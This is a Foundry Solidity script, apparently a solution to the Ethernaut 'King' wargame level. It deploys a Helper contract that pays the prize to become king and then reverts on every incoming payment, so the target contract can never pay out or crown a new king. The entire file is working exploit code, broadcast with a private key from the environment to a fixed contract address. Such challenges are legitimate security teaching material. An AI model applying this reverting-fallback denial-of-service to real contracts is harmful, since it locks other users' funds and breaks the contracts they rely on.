// SPDX-LIcense-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/9_King.sol";

contract Helper {
    King public target;

    constructor(King _target) payable {
        target = _target;
    }

    function exploit() external {
        payable(address(target)).call{value : address(this).balance}("");
    }

    receive() external payable {
        revert("King forever");
    }

    fallback() external payable {
        revert("King forever");
    }
}

contract POC is Script {
    King public target;
    Helper public helper;

    function setUp() external {
        target = King(payable(0x5C3ecA20D06f5808bf429838819D578D4f7e0181));
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        uint256 prize = target.prize();
        console.log("before prize: ", prize);

        address king = target._king();
        console.log("before king: ", king);

        helper = new Helper{value : prize + 1}(target);
        helper.exploit();

        prize = target.prize();
        console.log("\n  after prize: ", prize);

        king = target._king();
        console.log("after  king: ", king);

        vm.stopBroadcast();
    }

}